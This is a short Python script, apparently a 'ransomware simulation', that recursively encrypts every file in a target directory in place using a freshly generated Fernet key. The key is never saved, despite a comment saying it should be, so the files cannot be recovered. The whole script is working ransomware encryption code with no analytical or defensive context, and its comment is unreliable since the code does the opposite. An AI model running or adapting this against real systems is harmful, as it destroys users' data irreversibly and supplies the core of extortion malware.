from cryptography.fernet import Fernet
import os

# Generate and save the key securely
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_directory(directory_path):
    for subdir, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(subdir, file)
            encrypt_file(file_path)
            print(f"Encrypted: {file_path}")

if __name__ == "__main__":
    target_directory = "path/to/target/directory"
    encrypt_directory(target_directory)
    print("Ransomware Simulation Complete!")
